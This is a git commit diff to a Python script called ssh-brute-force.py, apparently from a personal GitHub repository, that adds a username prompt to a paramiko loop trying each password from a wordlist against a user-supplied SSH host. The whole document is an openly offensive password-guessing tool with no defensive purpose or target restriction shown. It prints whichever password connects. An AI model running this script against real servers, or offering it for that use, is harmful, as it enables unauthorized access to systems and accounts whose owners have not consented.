b60c3dc220efdc7af15e17109ddb32f136054b8d
badtree68 <108075849+badtree68@users.noreply.github.com>
2022-06-25 13:50:16 -0400

    Update ssh-brute-force.py

--- ssh-brute-force.py
+++ ssh-brute-force.py
@@ -5,11 +5,12 @@ bruteforce=paramiko.SSHClient()
 print(f"{Fore.RED} programmer : badtree68 {Fore.RESET}")
 ip=input(f"{Fore.GREEN}enter a ip: ")
 passlist=input("enter a passlist: ")
-time=input(f"enter your timeout: {Fore.RESET}")
+time=input("enter your timeout: ")
+user=input(f"enter a user: {Fore.RESET}")
 openfile=open(passlist,"r")
 for passwords in openfile:
     try:
-        bruteforce.connect(hostname=ip,password=passwords,timeout=time)
+        bruteforce.connect(hostname=ip,password=passwords,timeout=time,username=user)
         print(f"{Fore.BLACK}connected ! {passwords}")
     except:
         print(f"{Fore.YELLOW}password is incorrect {passwords}")
